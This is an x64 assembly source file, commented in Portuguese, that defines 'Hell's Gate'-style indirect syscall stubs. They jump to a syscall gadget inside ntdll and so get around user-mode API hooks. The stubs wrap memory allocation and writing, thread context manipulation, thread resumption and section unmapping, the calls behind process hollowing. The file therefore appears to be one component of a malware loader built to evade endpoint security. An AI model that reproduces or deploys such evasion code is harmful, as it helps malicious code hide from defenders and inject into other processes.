; =============================================================================
; syscalls.asm - Indirect syscall stubs (x64)
;
; Padrao Hell's Gate / indirect syscall:
;   mov r10, rcx                       ; kernel espera 1o arg em R10
;   mov eax, [num_do_syscall]          ; numero resolvido em runtime
;   jmp qword ptr [gadget]             ; pula pra 'syscall; ret' dentro do ntdll
;
; O gadget dentro do ntdll faz o `syscall`, depois `ret` volta pro chamador C++
; (o retorno original foi empilhado pelo `call <stub>` inicial).
; =============================================================================

EXTERN g_NtAllocateVirtualMemory_num:DWORD
EXTERN g_NtWriteVirtualMemory_num:DWORD
EXTERN g_NtReadVirtualMemory_num:DWORD
EXTERN g_NtSetContextThread_num:DWORD
EXTERN g_NtGetContextThread_num:DWORD
EXTERN g_NtResumeThread_num:DWORD
EXTERN g_NtUnmapViewOfSection_num:DWORD
EXTERN g_NtCreateFile_num:DWORD
EXTERN g_NtReadFile_num:DWORD
EXTERN g_NtClose_num:DWORD
EXTERN g_syscall_gadget:QWORD

.CODE

NtAllocateVirtualMemory_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtAllocateVirtualMemory_num]
    jmp QWORD PTR [g_syscall_gadget]
NtAllocateVirtualMemory_indirect ENDP

NtWriteVirtualMemory_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtWriteVirtualMemory_num]
    jmp QWORD PTR [g_syscall_gadget]
NtWriteVirtualMemory_indirect ENDP

NtReadVirtualMemory_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtReadVirtualMemory_num]
    jmp QWORD PTR [g_syscall_gadget]
NtReadVirtualMemory_indirect ENDP

NtSetContextThread_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtSetContextThread_num]
    jmp QWORD PTR [g_syscall_gadget]
NtSetContextThread_indirect ENDP

NtGetContextThread_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtGetContextThread_num]
    jmp QWORD PTR [g_syscall_gadget]
NtGetContextThread_indirect ENDP

NtResumeThread_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtResumeThread_num]
    jmp QWORD PTR [g_syscall_gadget]
NtResumeThread_indirect ENDP

NtUnmapViewOfSection_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtUnmapViewOfSection_num]
    jmp QWORD PTR [g_syscall_gadget]
NtUnmapViewOfSection_indirect ENDP

NtCreateFile_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtCreateFile_num]
    jmp QWORD PTR [g_syscall_gadget]
NtCreateFile_indirect ENDP

NtReadFile_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtReadFile_num]
    jmp QWORD PTR [g_syscall_gadget]
NtReadFile_indirect ENDP

NtClose_indirect PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtClose_num]
    jmp QWORD PTR [g_syscall_gadget]
NtClose_indirect ENDP

END
